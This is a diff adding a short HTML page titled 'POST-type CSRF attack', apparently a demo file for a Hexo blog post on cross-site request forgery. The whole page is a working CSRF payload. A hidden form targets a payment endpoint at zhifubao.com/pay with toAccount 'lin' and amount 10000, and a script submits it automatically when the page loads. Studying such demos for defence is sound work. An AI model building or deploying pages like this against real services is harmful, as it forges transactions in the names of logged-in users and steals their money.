@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <title>POST型CSRF攻击</title>
+</head>
+<body>
+<form action="http://zhifubao.com/pay" method="POST">
+    <input type="text" name="toAccount" value="lin">
+    <input type="text" name="amount" value="10000">
+</form>
+<script> document.forms[0].submit(); </script>
+</body>
+</html>
